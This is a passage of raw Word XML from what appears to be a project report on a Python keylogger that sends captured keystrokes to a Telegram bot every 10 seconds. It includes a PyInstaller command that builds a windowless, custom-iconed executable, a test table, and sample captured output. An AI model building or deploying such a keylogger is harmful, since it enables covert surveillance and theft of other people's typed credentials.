      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>ico</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> file in the same folder (optional for icon).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A57018" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="61"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32CA04AA" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="61"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>pyinstaller</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>onefile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>noconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> --icon=icon_file.ico --name=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>exe_name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> keylogger_telegram.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B21AD3A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="61"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">The .exe will appear inside the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>dist</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> folder.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25FF37C7" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="28720B46">
          <v:rect id="_x0000_i1444" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B0B9F7D" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>4.7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186"/>
        <w:gridCol w:w="4832"/>
      </w:tblGrid>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="16409FD2" w14:textId="77777777">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="17F26238" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Test Case</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="48AEAFB9" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Steps</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="70981A94" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Expected Result</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="7C7E51A1" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="483FFF19" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Run Script</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A2A4AAE" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Start script, press keys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="237FE4EE" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Keystrokes stored in log.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="217CEA9D" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="150E7F28" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Periodic Send</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6830EA22" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Wait 10 seconds</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="37931AEE" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Telegram bot receives a message with logged keys.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="5C8F20FF" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="50414DD2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Exit Command</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="74534162" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Type “</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>exitlog</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>”</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="39005379" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Script stops execution.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="79F1C0E2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="3A275153">
          <v:rect id="_x0000_i1445" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A818DAB" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> That’s </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Chapter 4 – Implementation</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> complete.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061536E4" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F009A39" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Chapter 5 – Results and Output</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05297F76" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>5.1 Execution Results</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="240B83FF" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">After configuring the </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>BOT_TOKEN</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>CHAT_ID</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>, the script was executed successfully.</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">The keylogger began capturing keystrokes and, every 10 seconds, the collected keystrokes were automatically sent to the configured </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Telegram chat</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D394F7" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Observed </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Behavior</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1806C4F0" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="62"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>At startup, the bot sent a “connected” message to confirm successful initialization.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56BDF2AB" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="62"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Every 10 seconds, a new message appeared in the Telegram chat containing the keystrokes typed during that interval.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50136EE6" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="62"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">When the keyword </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>exitlog</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> was typed anywhere, the program terminated safely and no further logs were sent.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14925329" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="4E641711">
          <v:rect id="_x0000_i1477" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C8D0B0F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>5.2 Example Output</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59EE1D02" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>(In the actual report you’d paste screenshots of your Telegram chat showing these messages)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EDBB869" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Telegram Chat Screenshot Placeholder:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E3E5016" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Bot: connected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="679341D1" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Bot: h e l </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> o   w o r l d </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1750E970" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Bot: [</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Key.space</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">] a d m </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1618207E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Bot: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>exitlog</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="36A33B18" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Bot stopped sending logs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1EDFD6" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>(Add real screenshots in the DOCX where these placeholders appear.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E7DDF98" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="70D5CA74">
          <v:rect id="_x0000_i1478" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
